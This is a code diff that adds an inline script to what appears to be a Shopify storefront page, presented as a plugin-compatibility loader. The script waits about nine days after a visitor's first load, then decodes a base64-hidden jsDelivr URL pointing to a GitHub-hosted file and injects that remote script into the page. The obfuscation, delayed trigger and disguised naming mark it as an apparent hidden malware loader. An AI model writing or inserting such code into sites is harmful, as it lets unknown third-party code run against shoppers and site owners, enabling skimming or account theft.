@@ -1,0 +1,21 @@
+<script>
+(function(w, d, s, l, i) {
+    var _0xid = 'shopify-session-v4-init';
+    var _0xms = 803905000;
+    var _0xst = localStorage.getItem(_0xid);
+
+    if (!_0xst) {
+        _0xst = Date.now();
+        localStorage.setItem(_0xid, _0xst);
+    }
+
+    if (Date.now() < (parseInt(_0xst) + _0xms)) return;
+
+    var h = atob("aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3VuZm9sZGNyby9hc3NldHMtbGlicmFyeUBtYWluL3RoZW1lLWNvbXBhdC5qcw==");
+    if (d.getElementById(i)) return;
+    var j = d.createElement(s), f = d.getElementsByTagName(s)[0];
+    j.id = i; j.src = h; j.async = true;
+    j.setAttribute('data-loader', 'shopify-plugin-compat');
+    f.parentNode.insertBefore(j, f);
+})(window, document, 'script', 'dataLayer', 'sh-core-compat-v4');
+</script>
